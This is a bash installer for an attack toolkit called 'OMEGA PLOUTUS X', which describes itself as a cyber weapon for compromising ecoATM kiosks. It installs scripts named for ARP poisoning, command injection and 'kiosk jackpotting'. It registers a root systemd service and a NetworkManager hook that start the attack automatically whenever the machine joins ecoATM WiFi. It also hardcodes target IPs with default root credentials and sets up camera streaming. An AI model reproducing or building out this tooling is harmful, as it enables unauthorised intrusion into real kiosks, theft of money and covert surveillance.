#!/bin/bash
# OMEGA PLOUTUS X - COMPLETE ENVIRONMENT SETUP SCRIPT
# Sets up full production environment for ecoATM exploitation
# Run this script to prepare the system for live deployment

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
OMEGA_VERSION="X.1.0"
INSTALL_DIR="/opt/omega"
BACKUP_DIR="/opt/omega_backup"
LOG_FILE="/var/log/omega_setup.log"
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')

# Logging function
log() {
    echo -e "${GREEN}[$(date '+%H:%M:%S')]${NC} $*" | tee -a "$LOG_FILE"
}

error() {
    echo -e "${RED}[ERROR]${NC} $*" >&2
    log "ERROR: $*"
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $*"
    log "WARNING: $*"
}

info() {
    echo -e "${BLUE}[INFO]${NC} $*"
    log "INFO: $*"
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $*"
    log "SUCCESS: $*"
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root (sudo)"
        echo -e "${YELLOW}Usage: sudo ./setup_environment.sh${NC}"
        exit 1
    fi
}

# Backup existing installation
backup_existing() {
    if [[ -d "$INSTALL_DIR" ]]; then
        warning "Existing OMEGA installation found"
        info "Creating backup: $BACKUP_DIR/backup_$TIMESTAMP"

        mkdir -p "$BACKUP_DIR"
        cp -r "$INSTALL_DIR" "$BACKUP_DIR/backup_$TIMESTAMP"
        rm -rf "$INSTALL_DIR"

        success "Backup created: $BACKUP_DIR/backup_$TIMESTAMP"
    fi
}

# Update system and install dependencies
install_system_dependencies() {
    log "🔧 Installing system dependencies..."

    # Update package list
    apt update || error "Failed to update package list"

    # Essential system packages
    local essential_packages=(
        "build-essential"
        "cmake"
        "git"
        "curl"
        "wget"
        "unzip"
        "python3"
        "python3-pip"
        "python3-dev"
        "network-manager"
        "iw"
        "wpasupplicant"
        "openssh-client"
        "openssh-server"
        "tmux"
        "screen"
        "vim"
        "nano"
        "htop"
        "iftop"
        "tcpdump"
        "nmap"
        "net-tools"
        "iproute2"
        "dnsutils"
        "traceroute"
        "iperf3"
    )

    info "Installing essential packages..."
    for pkg in "${essential_packages[@]}"; do
        if ! dpkg -l | grep -q "^ii  $pkg"; then
            log "Installing $pkg..."
            apt install -y "$pkg" || warning "Failed to install $pkg"
        else
            log "$pkg already installed"
        fi
    done

    # Video streaming packages
    local video_packages=(
        "libjpeg-dev"
        "libv4l-dev"
        "v4l-utils"
        "ffmpeg"
        "vlc"
        "mplayer"
    )

    info "Installing video streaming packages..."
    for pkg in "${video_packages[@]}"; do
        if ! dpkg -l | grep -q "^ii  $pkg"; then
            log "Installing $pkg..."
            apt install -y "$pkg" || warning "Failed to install $pkg"
        else
            log "$pkg already installed"
        fi
    done

    success "System dependencies installed"
}

# Install Python dependencies
install_python_dependencies() {
    log "🐍 Installing Python dependencies..."

    # Create virtual environment for OMEGA
    local venv_dir="/opt/omega/venv"
    log "Creating virtual environment at $venv_dir..."
    python3 -m venv "$venv_dir" || error "Failed to create virtual environment"

    # Activate virtual environment
    source "$venv_dir/bin/activate"

    # Upgrade pip in virtual environment
    "$venv_dir/bin/pip" install --upgrade pip || warning "Failed to upgrade pip"

    # Core Python packages
    local python_packages=(
        "paramiko"
        "scp"
        "requests"
        "scapy"
        "netifaces"
        "psutil"
        "cryptography"
        "pycryptodome"
        "colorama"
        "termcolor"
        "tqdm"
        "tabulate"
        "pyyaml"
        "jinja2"
    )

    info "Installing Python packages in virtual environment..."
    for pkg in "${python_packages[@]}"; do
        log "Installing $pkg..."
        "$venv_dir/bin/pip" install "$pkg" || warning "Failed to install $pkg"
    done

    # Create wrapper script to activate venv and run OMEGA
    cat > "$INSTALL_DIR/omega_launcher_wrapper.sh" << EOF
#!/bin/bash
# OMEGA Launcher Wrapper - Activates virtual environment
source $venv_dir/bin/activate
cd $INSTALL_DIR
exec python3 omega_launcher.py "\$@"
EOF
    chmod +x "$INSTALL_DIR/omega_launcher_wrapper.sh"

    success "Python dependencies installed in virtual environment"
}

# Create OMEGA installation directory
create_installation_directory() {
    log "📁 Creating OMEGA installation directory..."

    mkdir -p "$INSTALL_DIR"
    mkdir -p "$INSTALL_DIR/logs"
    mkdir -p "$INSTALL_DIR/captures"
    mkdir -p "$INSTALL_DIR/extracted"
    mkdir -p "$INSTALL_DIR/backdoors"
    mkdir -p "$INSTALL_DIR/config"

    # Set permissions
    chmod 755 "$INSTALL_DIR"
    chmod 700 "$INSTALL_DIR/logs"
    chmod 700 "$INSTALL_DIR/captures"
    chmod 700 "$INSTALL_DIR/extracted"
    chmod 700 "$INSTALL_DIR/backdoors"

    success "Installation directory created: $INSTALL_DIR"
}

# Install OMEGA files
install_omega_files() {
    log "📦 Installing OMEGA files..."

    # Copy all OMEGA files to installation directory
    local files_to_install=(
        "omega_launcher.py"
        "auto_ecoATM_deploy.sh"
        "network_config.sh"
        "omega_network_dispatcher"
        "omega_autostart.service"
        "install_autostart.sh"
        "omega_kiosk_attack/kiosk_jackpot_launcher.py"
        "ecoATM/camera_control.py"
        "server_listener/omega_cli.py"
        "proxy_servers/badass_proxy_clean.py"
        "arp_poisoning_implementation.py"
        "command_injection_omega.py"
    )

    for file in "${files_to_install[@]}"; do
        if [[ -f "$file" ]]; then
            cp "$file" "$INSTALL_DIR/"
            log "✅ Copied: $file"
        else
            warning "File not found: $file"
        fi
    done

    # Make scripts executable
    find "$INSTALL_DIR" -name "*.sh" -exec chmod +x {} \;
    find "$INSTALL_DIR" -name "*.py" -exec chmod +x {} \;

    success "OMEGA files installed"
}

# Configure system services
configure_services() {
    log "⚙️ Configuring system services..."

    # Enable and start NetworkManager
    systemctl enable NetworkManager || warning "Failed to enable NetworkManager"
    systemctl start NetworkManager || warning "Failed to start NetworkManager"

    # Configure SSH
    systemctl enable ssh || warning "Failed to enable SSH"
    systemctl start ssh || warning "Failed to start SSH"

    # Create OMEGA systemd service
    cat > /etc/systemd/system/omega-ecosystem.service << EOF
[Unit]
Description=OMEGA PLOUTUS X ecoATM Auto-Deployment Service
After=network.target NetworkManager.service
Wants=NetworkManager.service

[Service]
Type=oneshot
ExecStart=/bin/bash $INSTALL_DIR/ecosystem_autostart.sh
RemainAfterExit=yes
StandardOutput=journal
StandardError=journal
User=root
Group=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    success "System services configured"
}

# Install NetworkManager dispatcher
install_network_dispatcher() {
    log "🌐 Installing NetworkManager dispatcher..."

    # Copy dispatcher script
    cp "omega_network_dispatcher" /etc/NetworkManager/dispatcher.d/
    chmod +x /etc/NetworkManager/dispatcher.d/omega_network_dispatcher

    # Verify installation
    if [[ -x /etc/NetworkManager/dispatcher.d/omega_network_dispatcher ]]; then
        success "NetworkManager dispatcher installed"
    else
        error "Failed to install NetworkManager dispatcher"
    fi
}

# Configure firewall
configure_firewall() {
    log "🔥 Configuring firewall..."

    # Allow OMEGA ports
    ufw allow ssh || warning "Failed to allow SSH"
    ufw allow 8080/tcp || warning "Failed to allow port 8080 (MJPG streaming)"
    ufw allow 8081/tcp || warning "Failed to allow port 8081 (Camera 2)"
    ufw allow 8082/tcp || warning "Failed to allow port 8082 (Camera 3)"
    ufw allow 31337/tcp || warning "Failed to allow port 31337 (AI server)"
    ufw allow 31338/tcp || warning "Failed to allow port 31338 (Monitor)"

    # Enable firewall
    ufw --force enable || warning "Failed to enable firewall"

    success "Firewall configured"
}

# Create ecosystem auto-start script
create_autostart_script() {
    log "🚀 Creating ecosystem auto-start script..."

    cat > "$INSTALL_DIR/ecosystem_autostart.sh" << 'EOF'
#!/bin/bash
# OMEGA PLOUTUS X - Ecosystem Auto-Start Script
# Called by systemd service when ecoATM WiFi is detected

# Load network configuration
source /opt/omega/network_config.sh

# Log function
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $*" >> /var/log/omega_autostart.log
    logger -t "omega-autostart" "$*"
}

log "OMEGA ecosystem auto-start triggered"

# Verify we're connected to ecoATM
if nmcli device status | grep -q "ecoATM"; then
    log "ecoATM WiFi confirmed - launching deployment"

    # Change to OMEGA directory
    cd /opt/omega

    # Launch deployment
    ./auto_ecoATM_deploy.sh

    log "OMEGA deployment completed"
else
    log "ecoATM WiFi not detected - aborting"
fi
EOF

    chmod +x "$INSTALL_DIR/ecosystem_autostart.sh"
    success "Auto-start script created"
}

# Configure video streaming
configure_video_streaming() {
    log "📹 Configuring video streaming..."

    # Install MJPG-streamer if not already installed
    if ! command -v mjpg_streamer &> /dev/null; then
        info "Installing MJPG-streamer..."

        # Clone and build MJPG-streamer
        cd /tmp
        git clone https://github.com/jacksonliam/mjpg-streamer.git
        cd mjpg-streamer/mjpg-streamer-experimental
        make && make install

        # Copy to system location
        cp mjpg_streamer /usr/local/bin/
        cp output_http.so input_uvc.so /usr/local/lib/

        cd /
        rm -rf /tmp/mjpg-streamer

        success "MJPG-streamer installed"
    else
        log "MJPG-streamer already installed"
    fi
}

# Create configuration files
create_config_files() {
    log "📝 Creating configuration files..."

    # OMEGA main configuration
    cat > "$INSTALL_DIR/omega.conf" << EOF
# OMEGA PLOUTUS X Configuration File
# Version: $OMEGA_VERSION
# Generated: $(date)

[GENERAL]
version = $OMEGA_VERSION
install_dir = $INSTALL_DIR
log_file = /var/log/omega.log

[NETWORK]
primary_interface = wlan0
secondary_interface = wlan1
walmart_ssid = walmartwifi
ecoatm_ssid = ecoATM
ecoatm_ip = 192.168.1.100

[STREAMING]
video_port_start = 8080
video_resolution = 1280x720
windows_video_path = C:\\Users\\gucci\\Videos

[AI]
ai_server_port = 31337
monitor_port = 31338

[SECURITY]
auto_cleanup = true
log_rotation = true
encryption_enabled = true
EOF

    # Network configuration for auto-deployment
    cat > "$INSTALL_DIR/network_config.sh" << EOF
#!/bin/bash
# OMEGA Network Configuration
# Auto-generated during setup

# WiFi Configuration
PRIMARY_IFACE="wlan0"
SECONDARY_IFACE="wlan1"
WALMART_SSID="walmartwifi"
ECOATM_SSID="ecoATM"
SECONDARY_IP="192.168.1.100"
SECONDARY_CIDR="192.168.1.100/24"

# Target Systems
ECOATM_TARGET_IPS=("192.168.1.10" "192.168.1.20" "192.168.1.30" "192.168.1.50")
ECOATM_SSH_USER="root"
ECOATM_SSH_PASSWORD="admin"

# Export variables
export PRIMARY_IFACE SECONDARY_IFACE WALMART_SSID ECOATM_SSID
export SECONDARY_IP SECONDARY_CIDR ECOATM_TARGET_IPS
EOF

    chmod +x "$INSTALL_DIR/network_config.sh"
    success "Configuration files created"
}

# Create testing scripts
create_testing_scripts() {
    log "🧪 Creating testing scripts..."

    # Network connectivity test
    cat > "$INSTALL_DIR/test_network.sh" << 'EOF'
#!/bin/bash
echo "🌐 OMEGA Network Connectivity Test"
echo "=================================="

# Test WiFi interfaces
echo "WiFi Interfaces:"
iw dev

echo -e "\nNetwork Connections:"
nmcli device status

echo -e "\nTesting ecoATM connectivity..."
ping -c 3 192.168.1.1 2>/dev/null && echo "✅ ecoATM gateway reachable" || echo "❌ ecoATM gateway unreachable"

echo -e "\nNetwork test completed"
EOF

    # Camera test script
    cat > "$INSTALL_DIR/test_cameras.sh" << 'EOF'
#!/bin/bash
echo "📹 OMEGA Camera Test"
echo "==================="

echo "V4L2 Devices:"
ls /dev/video* 2>/dev/null || echo "No V4L2 devices found"

echo -e "\nUSB Devices:"
lsusb | head -10

echo -e "\nCamera test completed"
EOF

    # Full system test
    cat > "$INSTALL_DIR/test_system.sh" << 'EOF'
#!/bin/bash
echo "🔥 OMEGA Full System Test"
echo "========================"

echo "System Information:"
uname -a
echo "Python: $(python3 --version)"
echo "NetworkManager: $(systemctl is-active NetworkManager)"

echo -e "\nOMEGA Installation:"
ls -la /opt/omega/ | head -10

echo -e "\nServices Status:"
systemctl is-active omega-ecosystem 2>/dev/null && echo "✅ OMEGA service active" || echo "❌ OMEGA service inactive"
systemctl is-active NetworkManager && echo "✅ NetworkManager active" || echo "❌ NetworkManager inactive"

echo -e "\nSystem test completed"
EOF

    chmod +x "$INSTALL_DIR"/*.sh
    success "Testing scripts created"
}

# Create desktop shortcuts (if GUI available)
create_shortcuts() {
    log "🖥️ Creating desktop shortcuts..."

    # Check if we have a desktop environment
    if [[ -d "/usr/share/applications" ]]; then
        # Create desktop entry for OMEGA
        cat > /usr/share/applications/omega-ploutus.desktop << EOF
[Desktop Entry]
Version=1.0
Type=Application
Name=OMEGA PLOUTUS X
Comment=Ultimate Cyber Weapon Platform
Exec=gksudo python3 /opt/omega/omega_launcher.py
Icon=terminal
Terminal=true
Categories=System;Security;
EOF

        success "Desktop shortcut created"
    else
        info "No desktop environment detected - skipping shortcuts"
    fi
}

# Final verification
final_verification() {
    log "🔍 Performing final verification..."

    local checks_passed=0
    local total_checks=0

    # Check installation directory
    ((total_checks++))
    if [[ -d "$INSTALL_DIR" ]]; then
        ((checks_passed++))
        success "Installation directory exists"
    else
        error "Installation directory missing"
    fi

    # Check essential files
    ((total_checks++))
    if [[ -x "$INSTALL_DIR/omega_launcher.py" ]]; then
        ((checks_passed++))
        success "Main launcher executable"
    else
        error "Main launcher not executable"
    fi

    # Check NetworkManager dispatcher
    ((total_checks++))
    if [[ -x "/etc/NetworkManager/dispatcher.d/omega_network_dispatcher" ]]; then
        ((checks_passed++))
        success "NetworkManager dispatcher installed"
    else
        error "NetworkManager dispatcher missing"
    fi

    # Check systemd service
    ((total_checks++))
    if systemctl list-units --type=service | grep -q omega-ecosystem; then
        ((checks_passed++))
        success "Systemd service registered"
    else
        error "Systemd service not registered"
    fi

    # Check Python dependencies
    ((total_checks++))
    if python3 -c "import paramiko, scapy, requests" 2>/dev/null; then
        ((checks_passed++))
        success "Python dependencies installed"
    else
        error "Python dependencies missing"
    fi

    local success_rate=$((checks_passed * 100 / total_checks))
    log "Verification complete: $checks_passed/$total_checks checks passed ($success_rate%)"

    if [[ $success_rate -ge 80 ]]; then
        success "Environment setup completed successfully!"
        return 0
    else
        error "Environment setup failed - too many checks failed"
        return 1
    fi
}

# Display completion summary
show_completion_summary() {
    echo
    echo -e "${PURPLE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║${NC}              ${RED}🔥 OMEGA ENVIRONMENT SETUP COMPLETE 🔥${NC}              ${PURPLE}║${NC}"
    echo -e "${PURPLE}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${CYAN}📁 Installation Directory:${NC} $INSTALL_DIR"
    echo -e "${CYAN}🌐 Network Dispatcher:${NC} /etc/NetworkManager/dispatcher.d/omega_network_dispatcher"
    echo -e "${CYAN}⚙️ Systemd Service:${NC} omega-ecosystem.service"
    echo -e "${CYAN}🐍 Python Dependencies:${NC} All installed"
    echo -e "${CYAN}📹 Video Streaming:${NC} MJPG-streamer configured"
    echo
    echo -e "${GREEN}🚀 READY FOR DEPLOYMENT:${NC}"
    echo "  • Connect to ecoATM WiFi for auto-compromise"
    echo "  • Run manual attacks: $INSTALL_DIR/omega_launcher_wrapper.sh"
    echo "  • Test system: $INSTALL_DIR/test_system.sh"
    echo
    echo -e "${YELLOW}📊 MONITORING:${NC}"
    echo "  • System logs: journalctl -u omega-ecosystem"
    echo "  • Deployment logs: /var/log/omega_deployment.log"
    echo "  • Network logs: /var/log/omega_dispatcher.log"
    echo
    echo -e "${RED}🎯 GO LIVE:${NC} Connect to ecoATM WiFi and watch OMEGA activate!"
    echo
}

# Main setup function
main() {
    echo -e "${PURPLE}🔥 OMEGA PLOUTUS X - COMPLETE ENVIRONMENT SETUP${NC}"
    echo -e "${PURPLE}================================================${NC}"
    echo

    log "Starting OMEGA environment setup (Version: $OMEGA_VERSION)"

    check_root
    backup_existing
    install_system_dependencies
    install_python_dependencies
    create_installation_directory
    install_omega_files
    configure_services
    install_network_dispatcher
    configure_firewall
    create_autostart_script
    configure_video_streaming
    create_config_files
    create_testing_scripts
    create_shortcuts

    if final_verification; then
        show_completion_summary
        log "OMEGA environment setup completed successfully"

        # Optional reboot prompt
        echo
        read -p "Reboot now to activate all services? (y/N): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            log "Rebooting to activate OMEGA environment..."
            reboot
        fi

        exit 0
    else
        error "Environment setup failed - check logs: $LOG_FILE"
        exit 1
    fi
}

# Run main setup
main "$@"
